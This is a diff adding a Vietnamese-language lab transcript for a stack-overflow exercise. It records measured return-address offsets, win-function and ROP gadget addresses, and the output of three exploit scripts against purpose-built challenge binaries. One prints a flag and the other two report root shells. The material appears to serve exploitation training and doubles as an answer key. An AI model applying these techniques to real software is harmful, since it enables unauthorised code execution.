@@ -1,0 +1,63 @@
+=====================================================================
+Lab 3.4 - transcript (output THAT, chay tren server verify)
+Moi truong: Ubuntu 24.04.4 LTS, glibc 2.39, gcc 13.3.0
+ASLR: randomize_va_space = 2 (No PIE nen dia chi co dinh)
+=====================================================================
+
+$ bash build.sh
+[*] built: chall1 chall2 chall3 ; flag.txt created
+# flag.txt = FLAG{ret2win_level_cleared}
+
+---------------------------------------------------------------------
+Do offset bang cyclic (n=8) qua corefile - KHONG doan
+---------------------------------------------------------------------
+$ python3 measure.py ./chall1 'chall1>\n'
+./chall1: offset_to_saved_RIP = 56  (popped bytes = b'haaaaaaa')   # buf[48] + 8
+$ python3 measure.py ./chall2 'chall2>\n'
+./chall2: offset_to_saved_RIP = 40  (popped bytes = b'faaaaaaa')   # buf[32] + 8
+$ python3 measure.py ./chall3 'Nhap:\n'
+./chall3: offset_to_saved_RIP = 56  (popped bytes = b'haaaaaaa')   # buf[40] + pad + RBP
+
+---------------------------------------------------------------------
+Dia chi gadget / win
+---------------------------------------------------------------------
+$ nm chall1 | grep ' win$'
+0000000000401176 T win
+$ nm chall2 | grep -E ' (win|g)$'        ; # g = gadget pop rdi ; ret
+0000000000401166 T g
+0000000000401168 T win
+$ nm chall3 | grep -E ' (win|gadgets)$'  ; # gadgets: pop rdi;ret (0x401166), pop rsi;ret (0x401168)
+0000000000401166 T gadgets
+000000000040116a T win
+# ret tran (can stack) o ca ba: 0x40101a
+
+---------------------------------------------------------------------
+exp_chall1.py (de: ret2win khong tham so, offset 56 -> flag)
+---------------------------------------------------------------------
+$ python3 exp_chall1.py
+[+] Starting local process './chall1': pid ...
+[*] Process './chall1' stopped with exit code 0
+Flag: FLAG{ret2win_level_cleared}
+
+---------------------------------------------------------------------
+exp_chall2.py (trung binh: 1 tham so, offset 40, pop rdi 0xcafed00d + ret + win)
+---------------------------------------------------------------------
+$ python3 exp_chall2.py
+[*] Loaded ... gadgets for './chall2'
+[+] Starting local process './chall2': pid ...
+===SHELL_OK===
+uid=0(root) gid=0(root) groups=0(root)
+
+---------------------------------------------------------------------
+exp_chall3.py (kho hon: 2 tham so, offset 56, pop rdi 0xc0ffee + pop rsi 0x1337 + ret + win)
+---------------------------------------------------------------------
+$ python3 exp_chall3.py
+[*] Loaded ... gadgets for './chall3'
+[+] Starting local process './chall3': pid ...
+===SHELL_OK===
+uid=0(root) gid=0(root) groups=0(root)
+
+# exploit.py la driver chay lan luot ca ba exp_chall*.py.
+# KET QUA: chall1 in flag, chall2 va chall3 lay shell. Offset do bang cyclic:
+# chall1=56, chall2=40, chall3=56. Giong moi truong tham chieu cu (gcc 11.4)
+# vi layout -O0 cua cac ham nho nay on dinh giua gcc 11 va gcc 13.
